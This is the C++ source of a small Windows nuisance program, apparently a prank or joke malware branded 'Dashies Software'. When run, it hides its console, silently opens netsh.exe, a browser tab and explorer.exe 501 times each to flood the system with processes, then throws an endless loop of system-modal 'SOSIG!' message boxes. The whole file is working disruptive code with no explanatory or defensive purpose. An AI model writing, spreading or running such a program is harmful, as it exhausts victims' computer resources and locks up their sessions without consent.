
/* (c) All Rights Reserved, Dashies Software Inc. */

#include<windows.h>
#include<mmsystem.h>
#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<conio.h>
#include<math.h>
#include<time.h>
#include<lmcons.h>

#include<iostream>
#include<sstream>
#include<fstream>
#include<string>
#include<ctime>
#include<cstdlib>
#include<map>
#include<vector>
#include<algorithm>

using namespace std;

long int index = 0;
char PathBuffer[MAX_PATH];

std::string Path;

std::string ProcessPath() {
	GetModuleFileName(0, PathBuffer, MAX_PATH);
	Path = PathBuffer;  
	return Path;
}

int main(void) {
  	ShowWindow(GetConsoleWindow(), SW_HIDE);
  	  
      for(index = 0; index <= 500; index = index + 1) {
      	 ShellExecute(NULL, TEXT("open"), TEXT("C:\\Windows\\System32\\netsh.exe"), NULL, NULL, SW_HIDE);
      	 ShellExecute(NULL, TEXT("open"), TEXT("http://www.google.com#SeeHowIAddedHTTPInsteadOfHTTPs"), NULL, NULL, SW_HIDE);
      	 ShellExecute(NULL, TEXT("open"), TEXT("C:\\Windows\\explorer.exe"), NULL, NULL, SW_HIDE);
	  }
	  
    while(true) { MessageBox(NULL, TEXT("\n\n\tSOSIG! \n\n\t-DirectConnect"), TEXT("::: DASHIES :::"), MB_OK | MB_ICONSTOP | MB_SYSTEMMODAL); }
}




